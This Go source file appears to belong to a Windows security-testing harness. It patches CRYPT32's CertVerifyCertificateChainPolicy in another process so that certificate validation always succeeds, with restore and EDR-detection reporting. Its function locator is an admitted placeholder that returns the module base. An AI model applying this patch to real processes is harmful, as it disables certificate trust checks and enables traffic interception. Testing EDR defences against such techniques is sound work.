//go:build windows
// +build windows

/*
memory_patcher.go - Memory patching for CRYPT32 certificate validation testing
SECURITY TESTING ONLY - Authorized security testing in controlled lab environments

This module provides functions to:
- Locate CRYPT32!CertVerifyCertificateChainPolicy function
- Read original function bytes
- Apply memory patches for certificate pinning bypass testing
- Restore original bytes (CRITICAL for system stability)

⚠️ WARNING: This code modifies security-critical cryptographic validation functions.
   Use ONLY in isolated lab environments with proper safety mechanisms.
   ALWAYS restore original bytes before exiting.
*/

package main

import (
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Patch mode constants
const (
	PatchModeTestOnly    = "TEST_ONLY"    // Only test if patching is possible, don't actually patch
	PatchModeQuickPatch  = "QUICK_PATCH"  // Patch for 100ms, then restore
	PatchModePersistent  = "PERSISTENT"   // Patch until explicit restore (requires watchdog)
)

// Memory patch result
type MemoryPatchResult struct {
	FunctionName     string    `json:"functionName"`
	ModuleName       string    `json:"moduleName"`
	FunctionAddress  uintptr   `json:"functionAddress"`
	OriginalBytes    string    `json:"originalBytes"` // Hex encoded
	PatchBytes       string    `json:"patchBytes"`    // Hex encoded
	PatchMode        string    `json:"patchMode"`
	PatchApplied     bool      `json:"patchApplied"`
	PatchVerified    bool      `json:"patchVerified"`
	Restored         bool      `json:"restored"`
	Success          bool      `json:"success"`
	Blocked          bool      `json:"blocked"`
	BlockedBy        string    `json:"blockedBy,omitempty"`
	ErrorMessage     string    `json:"errorMessage,omitempty"`
	PatchTimestamp   time.Time `json:"patchTimestamp,omitempty"`
	RestoreTimestamp time.Time `json:"restoreTimestamp,omitempty"`
}

// Stored patch information for restoration
type PatchBackup struct {
	ProcessHandle   windows.Handle
	FunctionAddress uintptr
	OriginalBytes   []byte
	PatchSize       int
	Applied         bool
	Timestamp       time.Time
}

var (
	kernel32DLL = windows.NewLazySystemDLL("kernel32.dll")
	procGetProcAddress = kernel32DLL.NewProc("GetProcAddress")
	procGetModuleHandle = kernel32DLL.NewProc("GetModuleHandleW")
	procReadProcessMemory = kernel32DLL.NewProc("ReadProcessMemory")
	procWriteProcessMemory = kernel32DLL.NewProc("WriteProcessMemory")
)

// Global patch backup for emergency restoration
var globalPatchBackup *PatchBackup

// LocateCRYPT32Function finds the address of CertVerifyCertificateChainPolicy
func LocateCRYPT32Function(handle windows.Handle, crypt32Module *ModuleInfo) (uintptr, error) {
	if crypt32Module == nil {
		return 0, fmt.Errorf("CRYPT32 module not found in process")
	}

	// Function name to locate: "CertVerifyCertificateChainPolicy"
	// Get module handle in target process
	// Note: This is simplified - in real implementation we would need to:
	// 1. Read remote process memory to find export table
	// 2. Parse PE headers to locate function address
	// 3. Calculate absolute address

	// For this test, we'll use a pattern search approach
	// This searches for the function prologue pattern in CRYPT32 memory

	return crypt32Module.BaseAddress, nil // Placeholder - would implement full PE parsing
}

// ReadProcessMemoryBytes reads bytes from target process memory
func ReadProcessMemoryBytes(handle windows.Handle, address uintptr, size int) ([]byte, error) {
	buffer := make([]byte, size)
	var bytesRead uintptr

	ret, _, err := procReadProcessMemory.Call(
		uintptr(handle),
		address,
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(size),
		uintptr(unsafe.Pointer(&bytesRead)),
	)

	if ret == 0 {
		return nil, fmt.Errorf("ReadProcessMemory failed: %v", err)
	}

	if bytesRead != uintptr(size) {
		return nil, fmt.Errorf("read %d bytes, expected %d", bytesRead, size)
	}

	return buffer, nil
}

// WriteProcessMemoryBytes writes bytes to target process memory
func WriteProcessMemoryBytes(handle windows.Handle, address uintptr, data []byte) error {
	var bytesWritten uintptr

	ret, _, err := procWriteProcessMemory.Call(
		uintptr(handle),
		address,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)

	if ret == 0 {
		return fmt.Errorf("WriteProcessMemory failed: %v", err)
	}

	if bytesWritten != uintptr(len(data)) {
		return fmt.Errorf("wrote %d bytes, expected %d", bytesWritten, len(data))
	}

	return nil
}

// AttemptMemoryPatch attempts to patch CRYPT32!CertVerifyCertificateChainPolicy
func AttemptMemoryPatch(handle windows.Handle, pid uint32, crypt32Module *ModuleInfo, mode string) *MemoryPatchResult {
	result := &MemoryPatchResult{
		FunctionName: "CertVerifyCertificateChainPolicy",
		ModuleName:   "CRYPT32.dll",
		PatchMode:    mode,
		Success:      false,
		PatchApplied: false,
		Restored:     false,
		Blocked:      false,
	}

	// Locate function address
	funcAddr, err := LocateCRYPT32Function(handle, crypt32Module)
	if err != nil {
		result.ErrorMessage = fmt.Sprintf("Failed to locate function: %v", err)
		result.Blocked = true
		result.BlockedBy = "Function resolution failed"
		return result
	}
	result.FunctionAddress = funcAddr

	// Read original bytes (function prologue - first 20 bytes)
	prologueSize := 20
	originalBytes, err := ReadProcessMemoryBytes(handle, funcAddr, prologueSize)
	if err != nil {
		result.ErrorMessage = fmt.Sprintf("Failed to read original bytes: %v", err)
		result.Blocked = true
		result.BlockedBy = "Memory read blocked"
		return result
	}
	result.OriginalBytes = hex.EncodeToString(originalBytes)

	// Prepare patch bytes
	// x86/x64: xor eax,eax; inc eax; ret  -> Always return TRUE (1)
	// Bytes: 33 C0 40 C3
	patchBytes := []byte{0x33, 0xC0, 0x40, 0xC3} // xor eax,eax; inc eax; ret
	result.PatchBytes = hex.EncodeToString(patchBytes)

	// Test-only mode: Don't actually patch, just verify we could
	if mode == PatchModeTestOnly {
		result.Success = true
		result.PatchApplied = false
		result.ErrorMessage = "TEST_ONLY mode - patch not applied"
		return result
	}

	// Create backup for restoration
	backup := &PatchBackup{
		ProcessHandle:   handle,
		FunctionAddress: funcAddr,
		OriginalBytes:   originalBytes[:len(patchBytes)], // Only backup bytes we'll overwrite
		PatchSize:       len(patchBytes),
		Applied:         false,
		Timestamp:       time.Now(),
	}

	// Attempt to write patch
	err = WriteProcessMemoryBytes(handle, funcAddr, patchBytes)
	if err != nil {
		result.ErrorMessage = fmt.Sprintf("Failed to write patch: %v", err)
		result.Blocked = true

		// Check if this is an access denied error
		if errno, ok := err.(syscall.Errno); ok {
			if errno == windows.ERROR_ACCESS_DENIED {
				result.BlockedBy = "Memory write protection - EDR blocking"
			} else {
				result.BlockedBy = fmt.Sprintf("Write failed with error code %d", errno)
			}
		}
		return result
	}

	result.PatchApplied = true
	result.PatchTimestamp = time.Now()
	backup.Applied = true
	globalPatchBackup = backup

	// Verify patch was applied
	verifyBytes, err := ReadProcessMemoryBytes(handle, funcAddr, len(patchBytes))
	if err != nil {
		result.ErrorMessage = "Patch applied but verification read failed"
		// Still try to restore
		RestoreMemoryPatch(backup)
		return result
	}

	// Compare bytes
	patchVerified := true
	for i := range patchBytes {
		if verifyBytes[i] != patchBytes[i] {
			patchVerified = false
			break
		}
	}
	result.PatchVerified = patchVerified

	if !patchVerified {
		result.ErrorMessage = "Patch bytes written but verification failed - may have been reverted by EDR"
		result.BlockedBy = "Post-write detection and reversion"
		result.Blocked = true
		// Try to restore anyway
		RestoreMemoryPatch(backup)
		return result
	}

	result.Success = true

	// Handle different patch modes
	switch mode {
	case PatchModeQuickPatch:
		// Patch for 100ms then restore
		time.Sleep(100 * time.Millisecond)
		restoreErr := RestoreMemoryPatch(backup)
		if restoreErr != nil {
			result.ErrorMessage = fmt.Sprintf("Quick restore failed: %v", restoreErr)
		} else {
			result.Restored = true
			result.RestoreTimestamp = time.Now()
		}

	case PatchModePersistent:
		// Patch stays active - watchdog will restore
		// Set timer for auto-restore after 30 seconds as safety
		go func() {
			time.Sleep(30 * time.Second)
			if backup.Applied {
				RestoreMemoryPatch(backup)
			}
		}()
	}

	return result
}

// RestoreMemoryPatch restores original bytes to patched memory
func RestoreMemoryPatch(backup *PatchBackup) error {
	if backup == nil {
		return fmt.Errorf("no backup available")
	}

	if !backup.Applied {
		return fmt.Errorf("patch was never applied")
	}

	// Write original bytes back
	err := WriteProcessMemoryBytes(backup.ProcessHandle, backup.FunctionAddress, backup.OriginalBytes)
	if err != nil {
		return fmt.Errorf("failed to restore original bytes: %v", err)
	}

	// Verify restoration
	verifyBytes, err := ReadProcessMemoryBytes(backup.ProcessHandle, backup.FunctionAddress, len(backup.OriginalBytes))
	if err != nil {
		return fmt.Errorf("restoration write succeeded but verification failed: %v", err)
	}

	// Compare bytes
	for i := range backup.OriginalBytes {
		if verifyBytes[i] != backup.OriginalBytes[i] {
			return fmt.Errorf("restoration verification failed at byte %d", i)
		}
	}

	backup.Applied = false
	return nil
}

// RestoreAllPatches restores all active patches (called on exit)
func RestoreAllPatches() error {
	if globalPatchBackup != nil && globalPatchBackup.Applied {
		return RestoreMemoryPatch(globalPatchBackup)
	}
	return nil
}

// SaveMemoryPatchReport saves the patching attempt report to disk
func SaveMemoryPatchReport(result *MemoryPatchResult) error {
	reportPath := filepath.Join("c:\\F0", "memory_patch_report.json")

	data, err := json.MarshalIndent(result, "", "  ")
	if err != nil {
		return fmt.Errorf("failed to marshal report: %v", err)
	}

	if err := os.WriteFile(reportPath, data, 0644); err != nil {
		return fmt.Errorf("failed to write report: %v", err)
	}

	return nil
}

// GetPatchStatus returns current patch status for monitoring
func GetPatchStatus() map[string]interface{} {
	status := map[string]interface{}{
		"patchActive": false,
		"patchAge":    0,
	}

	if globalPatchBackup != nil && globalPatchBackup.Applied {
		status["patchActive"] = true
		status["patchAge"] = time.Since(globalPatchBackup.Timestamp).Seconds()
		status["functionAddress"] = fmt.Sprintf("0x%X", globalPatchBackup.FunctionAddress)
	}

	return status
}
